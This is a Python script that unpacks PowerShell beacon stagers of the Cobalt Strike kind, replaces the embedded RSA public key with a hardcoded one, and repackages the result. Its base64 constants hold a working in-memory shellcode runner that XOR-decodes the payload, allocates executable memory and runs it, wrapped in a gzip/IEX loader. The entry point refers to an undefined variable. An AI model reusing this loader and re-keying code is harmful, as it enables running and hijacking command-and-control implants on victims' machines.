import base64
import gzip
import io, re

head2_bytes = base64.b64decode("U2V0LVN0cmljdE1vZGUgLVZlcnNpb24gMgoKZnVuY3Rpb24gZnVuY19nZXRfcHJvY19hZGRyZXNzIHsKCVBhcmFtICgkdmFyX21vZHVsZSwgJHZhcl9wcm9jZWR1cmUpCQkKCSR2YXJfdW5zYWZlX25hdGl2ZV9tZXRob2RzID0gKFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8IFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfSkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKQoJJHZhcl9ncGEgPSAkdmFyX3Vuc2FmZV9uYXRpdmVfbWV0aG9kcy5HZXRNZXRob2QoJ0dldFByb2NBZGRyZXNzJywgW1R5cGVbXV0gQCgnU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZicsICdzdHJpbmcnKSkKCXJldHVybiAkdmFyX2dwYS5JbnZva2UoJG51bGwsIEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdKE5ldy1PYmplY3QgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZigoTmV3LU9iamVjdCBJbnRQdHIpLCAoJHZhcl91bnNhZmVfbmF0aXZlX21ldGhvZHMuR2V0TWV0aG9kKCdHZXRNb2R1bGVIYW5kbGUnKSkuSW52b2tlKCRudWxsLCBAKCR2YXJfbW9kdWxlKSkpKSwgJHZhcl9wcm9jZWR1cmUpKQp9CgpmdW5jdGlvbiBmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIHsKCVBhcmFtICgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXSBbVHlwZVtdXSAkdmFyX3BhcmFtZXRlcnMsCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEpXSBbVHlwZV0gJHZhcl9yZXR1cm5fdHlwZSA9IFtWb2lkXQoJKQoKCSR2YXJfdHlwZV9idWlsZGVyID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KChOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKSksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikuRGVmaW5lRHluYW1pY01vZHVsZSgnSW5NZW1vcnlNb2R1bGUnLCAkZmFsc2UpLkRlZmluZVR5cGUoJ015RGVsZWdhdGVUeXBlJywgJ0NsYXNzLCBQdWJsaWMsIFNlYWxlZCwgQW5zaUNsYXNzLCBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJHZhcl9yZXR1cm5fdHlwZSwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCglyZXR1cm4gJHZhcl90eXBlX2J1aWxkZXIuQ3JlYXRlVHlwZSgpCn0KCklmIChbSW50UHRyXTo6c2l6ZSAtZXEgOCkgewoJW0J5dGVbXV0kdmFyX2NvZGUgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCc=")

tail2_bytes = base64.b64decode("JykKCglmb3IgKCR4ID0gMDsgJHggLWx0ICR2YXJfY29kZS5Db3VudDsgJHgrKykgewoJCSR2YXJfY29kZVskeF0gPSAkdmFyX2NvZGVbJHhdIC1ieG9yIDM1Cgl9CgoJJHZhcl92YSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKChmdW5jX2dldF9wcm9jX2FkZHJlc3Mga2VybmVsMzIuZGxsIFZpcnR1YWxBbGxvYyksIChmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIEAoW0ludFB0cl0sIFtVSW50MzJdLCBbVUludDMyXSwgW1VJbnQzMl0pIChbSW50UHRyXSkpKQoJJHZhcl9idWZmZXIgPSAkdmFyX3ZhLkludm9rZShbSW50UHRyXTo6WmVybywgJHZhcl9jb2RlLkxlbmd0aCwgMHgzMDAwLCAweDQwKQoJW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkdmFyX2NvZGUsIDAsICR2YXJfYnVmZmVyLCAkdmFyX2NvZGUubGVuZ3RoKQoKCSR2YXJfcnVubWUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkdmFyX2J1ZmZlciwgKGZ1bmNfZ2V0X2RlbGVnYXRlX3R5cGUgQChbSW50UHRyXSkgKFtWb2lkXSkpKQoJJHZhcl9ydW5tZS5JbnZva2UoW0ludFB0cl06Olplcm8pCn0K")

def gunzip_data(gzip_data):
    decompressed_data = ""
    # 2. Gzip 解压
    with gzip.GzipFile(fileobj=io.BytesIO(gzip_data)) as gzip_file:
        decompressed_data = gzip_file.read()
        # decompressed_data = str(decompressed_data, encoding='utf-8')
        # print(decompressed_data)

        pattern_head = re.escape(head2_bytes)
        # 使用正则匹配并移除指定的尾部内容
        pattern_tail = re.escape(tail2_bytes)

        # 替换指定尾部内容为空字符串
        decompressed_data = re.sub(b"^" + pattern_head, b"", decompressed_data)

        decompressed_data = re.sub(pattern_tail + b"$", b"", decompressed_data)

        # print(decompressed_data)  # "==" 将被保留
        return decompressed_data

def rollback_beacon(after_key_change_beacon):
    new_pubkey_beacon = bytes([byte ^ 35 for byte in after_key_change_beacon])
    new_pubkey_beacon = base64.b64encode(new_pubkey_beacon)

    new_shellcode = head2_bytes + new_pubkey_beacon + tail2_bytes
    compressed_new_shellcode = gzip.compress(new_shellcode)

    new_shellcode = base64.b64encode(compressed_new_shellcode)

    new_shellcode = b'$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("'+new_shellcode+b'"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();]$'

    return new_shellcode



def change_to_new_pubKey(ori_response):
    # 0. 提取
    ori_response = ori_response.lstrip(b'$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("')
    beacon_content = ori_response.rstrip(b'"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();]$')
    # 1. Base64 解码 + gunzip + 提取 + base64解码
    after_base64_data = base64.b64decode(beacon_content)
    after_gunzip_data = gunzip_data(after_base64_data)
    after_base64_data = base64.b64decode(after_gunzip_data)

    # 2. 按位异或操作（与 35 异或）
    xor_result = bytes([byte ^ 35 for byte in after_base64_data])

    # 3. 定位公钥位置，替换公钥
    pattern_to_find = b'\x1E\xAF\xB1\x1E\x23\x28\x27'
    # 查找模式在数据中的起始位置
    start_replace = xor_result.find(pattern_to_find)
    end_replace = start_replace + 2048 // 8

    my_pk_hex = b'\x30\x81\x9f\x30\x0d\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01\x05\x00\x03\x81\x8d\x00\x30\x81\x89\x02\x81\x81\x00\xd8\xb8\xf8\x02\x7c\x0c\xb9\x7f\x9d\x86\x76\x3f\x22\x7b\x9a\x48\xad\x75\xf4\x72\x8f\x24\x47\x30\xb1\x54\x19\x5d\x19\x68\x7c\xaa\x0c\x9b\xcd\x14\xa9\x47\xec\xb8\x0e\x7c\xea\x62\x9f\x3a\x22\x17\x15\x2b\x1d\xb6\x4f\xf9\xd4\xcb\x5a\x3a\x42\xbf\x4d\x85\x33\x8f\x65\x3e\xe0\xe9\xbc\xf0\x6f\x04\x11\x95\x7d\xf7\xbf\x8e\x1c\x30\xb8\x85\x2a\x76\xbf\x22\xab\x95\x6e\xec\xff\xec\xd4\x39\x1d\x67\x77\xbc\xcd\x93\xe2\xcf\xae\x16\xaa\x6a\xf4\x77\xe2\x77\x65\x65\xa8\xd1\x27\xcd\xe2\x90\x61\x56\xb6\x6c\xa0\x05\x3b\x77\x01\x97\x02\x03\x01\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

    # print(len(my_pk_hex))
    # 异或处理后的数据
    xor_key = 0x2E
    xor_data = bytes([b ^ xor_key for b in my_pk_hex])

    # print(xor_data.hex())
    str2 = "1eafb11e23282704a866a8d9232f2f2f2b2e2dafa32e1eafa72cafaf2ef696d62c52229751b3a858110c55b466835bda5ca10a691e9f7a37733746528422b5e33a8769c2962052c44cb1140c393b05339861d7fae574146c9163ab1da14b10cec792de412a3fbb53d991a0321e96ab0458910c85bb40c2d1c2fa1733495992e3bdcce180388444da59cc594b4b86ff09e3ccbe4f7898428e2b15592fb92c2d2f2e2f2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e"
    # print(str2)
    # print(str2 == xor_data.hex())
    # print(len(str2))

    # 转换为带有 \x 前缀的十六进制格式
    byte_data = bytes.fromhex(xor_data.hex())
    formatted_hex_string = ''.join(f'\\x{byte:02x}' for byte in byte_data)

    # 输出结果
    print(f"b'{formatted_hex_string}'")
    print()
    original_pub_key = xor_result[start_replace:end_replace]
    original_pub_key_xor = bytes([b ^ xor_key for b in original_pub_key])


    after_key_change_beacon = xor_result[:start_replace] + xor_data + xor_result[end_replace:]

    # 4. 还原beacon
    new_beacon = rollback_beacon(after_key_change_beacon)
    
    # # 3. 写入文件
    # output_file = "../CSthing/1768_v0_0_8/xor_output_newkey.bin"
    # # 以二进制模式写入文件
    # with open(output_file, "wb") as file:
    #     file.write(new_beacon)
    # print(new_beacon)
    return original_pub_key_xor, new_beacon

if __name__ == '__main__':
    change_to_new_pubKey(ori_response)

